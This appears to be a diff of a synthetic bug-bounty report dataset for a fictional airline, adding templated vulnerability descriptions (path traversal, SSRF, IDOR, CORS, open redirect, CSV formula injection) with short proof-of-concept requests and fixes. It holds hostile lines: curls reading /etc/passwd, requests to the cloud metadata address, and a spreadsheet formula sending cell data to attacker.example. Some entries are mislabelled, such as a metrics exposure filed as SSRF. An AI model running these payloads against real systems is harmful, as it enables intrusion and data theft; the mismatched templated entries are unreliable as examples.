+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7677,7 +7735,8 @@
           "offset": "3d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7773,7 +7832,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7883,7 +7943,8 @@
           "offset": "7d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/import`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8055,7 +8116,8 @@
           "offset": "6d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.sonnenhafen-airlines.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8133,7 +8195,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.sonnenhafen-airlines.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8320,7 +8383,8 @@
           "offset": "8d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8460,7 +8524,8 @@
           "offset": "7d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.sonnenhafen-airlines.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8554,7 +8619,8 @@
           "offset": "3d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8686,7 +8752,8 @@
           "offset": "5d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8790,7 +8857,8 @@
           "offset": "1d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8939,7 +9007,8 @@
           "offset": "4d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9118,7 +9187,8 @@
           "offset": "8d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9282,7 +9352,8 @@
           "offset": "8d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9434,7 +9505,8 @@
           "offset": "5d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9581,7 +9653,8 @@
           "offset": "6d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.sonnenhafen-airlines.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9717,7 +9790,8 @@
           "offset": "5d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9877,7 +9951,8 @@
           "offset": "4d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9997,7 +10072,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10103,7 +10179,8 @@
           "offset": "5d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10215,7 +10292,8 @@
           "offset": "11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10317,7 +10395,8 @@
           "offset": "5d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/import`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10387,7 +10466,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.sonnenhafen-airlines.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10501,7 +10581,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10625,7 +10706,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10805,7 +10887,8 @@
           "offset": "8d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10927,7 +11010,8 @@
           "offset": "3d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.sonnenhafen-airlines.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11046,7 +11130,8 @@
           "offset": "4d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11161,7 +11246,8 @@
           "offset": "2d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.sonnenhafen-airlines.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11264,7 +11350,8 @@
           "offset": "4d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11403,7 +11490,8 @@
           "offset": "5d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://ops.sonnenhafen-airlines.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11522,7 +11610,8 @@
           "offset": "10d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
